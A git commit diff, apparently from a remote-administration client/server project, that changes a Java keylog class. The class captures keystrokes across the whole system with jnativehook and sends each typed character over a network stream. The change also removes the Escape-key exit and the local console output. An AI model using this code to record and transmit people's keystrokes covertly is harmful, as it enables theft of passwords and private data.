0797102e9b874fb1458ab102dd504da5bfd5f4e4
dauduathomngon <lenguyen18072003@gmail.com>
2022-11-24 15:06:41 +0700

    update keylog function

--- server/src/main/java/com/mmt/server/Model/ServerKeyListener.java
+++ server/src/main/java/com/mmt/server/Model/ServerKeyListener.java
@@ -1,30 +1,27 @@
 package com.mmt.server.Model;
 
-import com.github.kwhat.jnativehook.GlobalScreen;
-import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.IOException;
 
 public class ServerKeyListener implements NativeKeyListener {
+
     public ServerKeyListener() {
     }
 
     public void nativeKeyPressed(NativeKeyEvent e) {
+    }
+
+    public void nativeKeyReleased(NativeKeyEvent e) {
+    }
+
+    public void nativeKeyTyped(NativeKeyEvent e) {
         try {
-            String a = NativeKeyEvent.getKeyText((e.getKeyCode()));
-            ServerHandlerModel.getOutput().writeUTF(a);
-            System.out.println(a);
+            String key = String.valueOf(e.getKeyChar());
+            ServerHandlerModel.getOutput().writeUTF(key);
         } catch (IOException ex) {
             throw new RuntimeException(ex);
-        }
-        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
-            try {
-                GlobalScreen.unregisterNativeHook();
-            } catch (NativeHookException nativeHookException) {
-                nativeHookException.printStackTrace();
-            }
         }
     }
 }
